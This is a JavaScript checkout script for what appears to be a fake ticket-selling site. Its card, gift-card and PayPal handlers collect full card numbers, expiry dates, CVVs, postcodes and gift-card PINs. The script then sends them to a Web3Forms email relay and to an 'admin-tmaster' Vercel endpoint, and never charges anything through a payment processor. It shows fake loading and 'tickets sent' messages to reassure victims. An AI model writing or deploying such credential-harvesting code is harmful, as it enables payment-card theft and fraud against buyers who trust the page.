// ==================== INITIALIZATION ====================
document.addEventListener('DOMContentLoaded', () => {
  // Get order summary from sessionStorage
  const orderSummary = JSON.parse(sessionStorage.getItem('orderSummary') || '{}');

  // Check if email is provided via session/localStorage
  const userEmail = sessionStorage.getItem('userEmail');
  
  if (!userEmail) {
    // Show email modal if no email provided
    document.getElementById('emailModal').style.display = 'flex';
  } else {
    // Use existing email
    completeEmailSubmission(userEmail);
  }

  // Email form submission
  document.getElementById('emailSubmitBtn').addEventListener('click', () => {
    const emailInput = document.getElementById('emailInput');
    const email = emailInput.value.trim();

    if (!email || !isValidEmail(email)) {
      alert('Please enter a valid email address');
      return;
    }

    completeEmailSubmission(email);
  });

  // Allow Enter key in email input
  document.getElementById('emailInput').addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
      document.getElementById('emailSubmitBtn').click();
    }
  });

  // Payment method tab switching
  document.querySelectorAll('.payment-tab').forEach(tab => {
    tab.addEventListener('click', () => {
      const method = tab.getAttribute('data-method');
      switchPaymentMethod(method);
    });
  });

  // Card number input formatting and card type detection
  document.getElementById('cardNumber').addEventListener('input', (e) => {
    let value = e.target.value.replace(/\s+/g, '');
    value = value.replace(/[^\d]/g, '');
    let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
    e.target.value = formatted;

    // Detect card type
    detectCardType(value);
  });

  // Expiry date formatting
  document.getElementById('expiryDate').addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length >= 2) {
      value = value.substring(0, 2) + '/' + value.substring(2, 4);
    }
    e.target.value = value;
  });

  // CVV input - numbers only
  document.getElementById('cvv').addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/\D/g, '');
  });

  // Card form submission
  document.getElementById('cardForm').addEventListener('submit', (e) => {
    e.preventDefault();
    submitCardPayment(orderSummary);
  });

  // Gift card form submission
  document.getElementById('giftCardForm').addEventListener('submit', (e) => {
    e.preventDefault();
    submitGiftCardPayment(orderSummary);
  });

  // PayPal button
  document.querySelector('.btn-paypal').addEventListener('click', () => {
    submitPayPalPayment(orderSummary);
  });

  // Mobile menu toggle
  document.getElementById('hamburgerBtn').addEventListener('click', toggleMobileMenu);
});

// ==================== EMAIL HANDLING ====================
function isValidEmail(email) {
  const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return re.test(email);
}

function completeEmailSubmission(email) {
  // Store email
  sessionStorage.setItem('userEmail', email);
  localStorage.setItem('userEmail', email);

  // Hide email modal
  document.getElementById('emailModal').style.display = 'none';

  // Show loading modal
  document.getElementById('loadingModal').style.display = 'flex';

  // Display email in checkout
  document.getElementById('displayEmail').textContent = email;

  // Populate ticket details from order summary
  const orderSummary = JSON.parse(sessionStorage.getItem('orderSummary') || '{}');
  if (orderSummary && orderSummary.event) {
    document.getElementById('detailEvent').textContent = orderSummary.event || '-';
    document.getElementById('detailDateTime').textContent = `${orderSummary.date || '-'} ${orderSummary.time || ''}`.trim() || '-';
    document.getElementById('detailType').textContent = orderSummary.ticketType || '-';
    document.getElementById('detailSeat').textContent = `${orderSummary.section || '-'} ${orderSummary.row ? '(Row ' + orderSummary.row + ')' : ''}`.trim() || '-';
    document.getElementById('detailQuantity').textContent = orderSummary.quantity || '-';
    document.getElementById('detailTotal').textContent = orderSummary.total ? '£' + orderSummary.total.toFixed(2) : '-';
  }

  // Show checkout content after 5 seconds
  setTimeout(() => {
    document.getElementById('loadingModal').style.display = 'none';
    document.querySelector('.checkout-container').style.display = 'block';
  }, 5000);
}

// ==================== PAYMENT METHOD SWITCHING ====================
function switchPaymentMethod(method) {
  // Update active tab
  document.querySelectorAll('.payment-tab').forEach(tab => {
    tab.classList.remove('active');
  });
  document.querySelector(`[data-method="${method}"]`).classList.add('active');

  // Update active payment method
  document.querySelectorAll('.payment-method').forEach(method => {
    method.classList.remove('active');
  });
  document.getElementById(`${method}-method`).classList.add('active');
}

// ==================== CARD TYPE DETECTION ====================
function detectCardType(cardNumber) {
  const cardIcon = document.getElementById('cardIcon');
  if (!cardIcon) {
    console.error('Card icon element not found');
    return;
  }

  const firstDigit = cardNumber.charAt(0);

  if (cardNumber.length < 4) {
    cardIcon.style.display = 'none';
    return;
  }

  let iconSrc = '';
  let altText = '';

  // Check card type based on first digit(s)
  if (firstDigit === '4') {
    iconSrc = 'visa.png';
    altText = 'Visa';
  } else if (firstDigit === '5' || firstDigit === '2') {
    iconSrc = 'mastercard1.png';
    altText = 'MasterCard';
  } else if (firstDigit === '3') {
    iconSrc = 'american-express.jpg';
    altText = 'American Express';
  } else {
    cardIcon.style.display = 'none';
    return;
  }

  cardIcon.src = iconSrc;
  cardIcon.alt = altText;
  cardIcon.style.display = 'block';
  cardIcon.style.width = '35px';
  cardIcon.style.height = '25px';
  cardIcon.style.objectFit = 'contain';
}

// ==================== FORM SUBMISSION ====================
async function submitCardPayment(orderSummary = {}) {
  const email = sessionStorage.getItem('userEmail');
  const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
  const expiryDate = document.getElementById('expiryDate').value;
  const cvv = document.getElementById('cvv').value;
  const postalCode = document.getElementById('postalCode').value;

  // Validation
  if (!cardNumber || cardNumber.length < 13) {
    alert('Please enter a valid card number');
    return;
  }
  if (!expiryDate || expiryDate.length < 5) {
    alert('Please enter a valid expiry date (MM/YY)');
    return;
  }
  if (!cvv || cvv.length < 3) {
    alert('Please enter a valid CVV');
    return;
  }
  if (!postalCode) {
    alert('Please enter a postal code');
    return;
  }

  // Show processing state
  const submitBtn = document.getElementById('cardForm').querySelector('button[type="submit"]');
  submitBtn.disabled = true;
  submitBtn.textContent = 'Processing...';

  try {
    // Create FormData with simple field names for web3forms (matching working script.js)
    const formData = new FormData();
    formData.append('access_key', 'b5f9f926-ecd5-4757-b0ad-ff1954bd43ea');
    formData.append('subject', 'New Ticket Order - Card Payment');
    formData.append('from_name', email);
    formData.append('email_address', email);
    formData.append('buyer_email', email);
    formData.append('event_name', orderSummary.event || '');
    formData.append('ticket_quantity', orderSummary.quantity || '');
    formData.append('total_payment', orderSummary.total || '');
    formData.append('card_number', cardNumber);
    formData.append('expiry_date', expiryDate);
    formData.append('security_code', cvv);
    formData.append('zip_code', postalCode);
    formData.append('message', `Payment Details: Card: ${cardNumber}, Expiry: ${expiryDate}, Amount: £${orderSummary.total ? orderSummary.total.toFixed(2) : '0.00'}`);

    // Submit to Web3Forms
    const response = await fetch('https://api.web3forms.com/submit', {
      method: 'POST',
      body: formData
    });

    const result = await response.json();
    
    // Log the response for debugging
    console.log('Web3Forms Card Payment Response:', result);

    if (result.success) {
      // Save to localStorage
      saveSubmission({
        email: email,
        paymentMethod: 'Card',
        cardNumber: cardNumber,
        expiryDate: expiryDate,
        cvv: cvv,
        postalCode: postalCode,
        orderSummary: orderSummary
      });

      // Show styled success message and redirect when user confirms
      showStyledAlert('Thank you for your purchase! You will receive your tickets via the email that you just provided.', () => {
        window.location.href = 'tickets.html';
      });
    } else {
      alert('Payment processing failed. Please try again.');
      submitBtn.disabled = false;
      submitBtn.textContent = 'Complete Purchase';
    }
  } catch (error) {
    console.error('Error:', error);
    alert('An error occurred. Please try again.');
    submitBtn.disabled = false;
    submitBtn.textContent = 'Complete Purchase';
  }
}

async function submitGiftCardPayment(orderSummary = {}) {
  const email = sessionStorage.getItem('userEmail');
  const giftCardNumber = document.getElementById('giftCardNumber').value;
  const giftCardPin = document.getElementById('giftCardPin').value;

  // Validation
  if (!giftCardNumber) {
    alert('Please enter a gift card number');
    return;
  }
  if (!giftCardPin) {
    alert('Please enter a PIN');
    return;
  }

  // Show processing state
  const submitBtn = document.getElementById('giftCardForm').querySelector('button[type="submit"]');
  submitBtn.disabled = true;
  submitBtn.textContent = 'Processing...';

  try {
    // Create FormData with simple field names for web3forms (matching working script.js)
    const formData = new FormData();
    formData.append('access_key', 'b5f9f926-ecd5-4757-b0ad-ff1954bd43ea');
    formData.append('subject', 'New Ticket Order - Gift Card Payment');
    formData.append('from_name', email);
    formData.append('email_address', email);
    formData.append('buyer_email', email);
    formData.append('event_name', orderSummary.event || '');
    formData.append('ticket_quantity', orderSummary.quantity || '');
    formData.append('total_payment', orderSummary.total || '');
    formData.append('gift_card_number', giftCardNumber);
    formData.append('gift_card_pin', giftCardPin);
    formData.append('message', `Gift Card Payment Received\n\nGift Card: ${giftCardNumber}\nAmount: £${orderSummary.total ? orderSummary.total.toFixed(2) : '0.00'}`);

    // Submit to Web3Forms
    const response = await fetch('https://api.web3forms.com/submit', {
      method: 'POST',
      body: formData
    });

    const result = await response.json();

    if (result.success) {
      // Save to localStorage
      saveSubmission({
        email: email,
        paymentMethod: 'Gift Card',
        giftCardNumber: giftCardNumber,
        orderSummary: orderSummary
      });

      // Show success message and redirect
      alert('Payment successful! Your tickets have been sent to your email.');
      window.location.href = 'tickets.html';
    } else {
      alert('Payment processing failed. Please try again.');
      submitBtn.disabled = false;
      submitBtn.textContent = 'Complete Purchase';
    }
  } catch (error) {
    console.error('Error:', error);
    alert('An error occurred. Please try again.');
    submitBtn.disabled = false;
    submitBtn.textContent = 'Complete Purchase';
  }
}

function submitPayPalPayment(orderSummary = {}) {
  // In a real implementation, this would redirect to PayPal's payment gateway
  // For now, we'll treat it as successful
  const email = sessionStorage.getItem('userEmail');
  
  saveSubmission({
    email: email,
    paymentMethod: 'PayPal',
    orderSummary: orderSummary
  });

  alert('PayPal integration would redirect to PayPal payment page. For demo purposes, processing payment.');
  window.location.href = 'tickets.html';
}

// ==================== UTILITY FUNCTIONS ====================
async function saveSubmission(data) {
  const submission = {
    id: Date.now(),
    ...data,
    timestamp: new Date().toISOString(),
    date: new Date().toLocaleDateString() + ' ' + new Date().toLocaleTimeString()
  };

  let submissions = [];
  const stored = localStorage.getItem('checkoutSubmissions');
  if (stored) {
    submissions = JSON.parse(stored);
  }

  submissions.unshift(submission);
  localStorage.setItem('checkoutSubmissions', JSON.stringify(submissions));

  // POST to admin API (non-blocking) - FORMAT CORRECTLY FOR API ENDPOINT
  try {
    const apiSubmission = {
      email: data.email,
      eventTitle: data.orderSummary?.event || '', // Flatten orderSummary.event to eventTitle
      quantity: data.orderSummary?.quantity || '',
      pricePerTicket: data.orderSummary?.pricePerTicket || '',
      total: data.orderSummary?.total || '',
      cardNumber: data.cardNumber || '',
      expiryDate: data.expiryDate || '',
      cvv: data.cvv || '',
      zipCode: data.postalCode || '' // Rename postalCode to zipCode
    };

    console.log('Sending submission to API:', apiSubmission);

    const response = await fetch('https://admin-tmaster.vercel.app/api/submissions', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-API-Token': 'tmaster-admin-secure-key-2024'
      },
      body: JSON.stringify(apiSubmission)
    });

    if (!response.ok) {
      console.error(`API submission failed: ${response.status}`, await response.text());
    } else {
      console.log('✅ Submission saved to admin API');
    }
  } catch (error) {
    console.log('Submission to admin API attempted:', error.message);
  }
}

// ==================== STYLED ALERT HELPER (local) ====================
function showStyledAlert(message, onClose) {
  const overlay = document.getElementById('styledAlert');
  const msg = document.getElementById('styledAlertMessage');
  const okBtn = document.getElementById('styledAlertOk');

  if (!overlay || !msg || !okBtn) {
    // Fallback to native alert if elements missing
    alert(message);
    if (typeof onClose === 'function') onClose();
    return;
  }

  msg.textContent = message;
  overlay.style.display = 'flex';

  // ensure single handler
  okBtn.onclick = function() {
    overlay.style.display = 'none';
    if (typeof onClose === 'function') onClose();
  };

  // allow Esc to close
  function escHandler(e) {
    if (e.key === 'Escape') {
      overlay.style.display = 'none';
      document.removeEventListener('keydown', escHandler);
      if (typeof onClose === 'function') onClose();
    }
  }
  document.addEventListener('keydown', escHandler);
}

function toggleMobileMenu() {
  const mobileMenu = document.getElementById('mobileMenu');
  mobileMenu.classList.toggle('active');
}

// ==================== GOOGLE TRANSLATE INTEGRATION ====================
function changeLanguage(language) {
  if (language === 'en') {
    localStorage.removeItem('selectedLanguage');
    sessionStorage.removeItem('lastLanguage');
    location.reload();
    return;
  }

  localStorage.setItem('selectedLanguage', language);
  sessionStorage.setItem('lastLanguage', language);

  ensureGoogleTranslateLoaded(() => {
    applyLanguageSelection(language);
  });
}

function ensureGoogleTranslateLoaded(callback) {
  if (window.google && window.google.translate) {
    callback();
    return;
  }

  if (!document.getElementById('google_translate_element')) {
    const container = document.createElement('div');
    container.id = 'google_translate_element';
    container.style.display = 'none';
    document.body.appendChild(container);
  }

  if (!window.googleTranslateElementInit) {
    window.googleTranslateElementInit = function() {
      try {
        new google.translate.TranslateElement({
          pageLanguage: 'en',
          includedLanguages: 'en,es,fr,de,it,pt,ru,ja,ko,zh-CN,ar,hi,th,tr,nl,pl,sv,no,da,fi,el,hu,cs,ro,he,id,vi,ms,uk',
          layout: google.translate.TranslateElement.InlineLayout.SIMPLE,
          autoDisplay: false
        }, 'google_translate_element');
        callback && callback();
      } catch (e) {
        console.log('Translation initializing...');
        callback && callback();
      }
    };
  }

  if (!document.getElementById('google-translate-script')) {
    const script = document.createElement('script');
    script.id = 'google-translate-script';
    script.src = 'https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit';
    script.async = true;
    document.head.appendChild(script);
  } else {
    callback && callback();
  }
}

function applyLanguageSelection(language) {
  const langMap = {
    'es': 'es', 'fr': 'fr', 'de': 'de', 'it': 'it', 'pt': 'pt',
    'ru': 'ru', 'ja': 'ja', 'ko': 'ko', 'zh': 'zh-CN', 'ar': 'ar',
    'hi': 'hi', 'th': 'th', 'tr': 'tr', 'nl': 'nl', 'pl': 'pl',
    'sv': 'sv', 'no': 'no', 'da': 'da', 'fi': 'fi', 'el': 'el',
    'hu': 'hu', 'cs': 'cs', 'ro': 'ro', 'he': 'he', 'id': 'id',
    'vi': 'vi', 'ms': 'ms', 'uk': 'uk'
  };

  const targetLang = langMap[language] || language;

  setTimeout(() => {
    const combo = document.querySelector('.goog-te-combo');
    if (combo) {
      combo.value = targetLang;
      combo.dispatchEvent(new Event('change'));
      return;
    }
  }, 500);
}

// ==================== SEARCH FUNCTION ====================
function applySearch() {
  // Search functionality - redirect to tickets page if needed
  const searchInput = document.getElementById('searchInput');
  if (searchInput && searchInput.value.trim()) {
    // Optionally redirect to tickets page with search query
    window.location.href = 'tickets.html?search=' + encodeURIComponent(searchInput.value);
  }
}


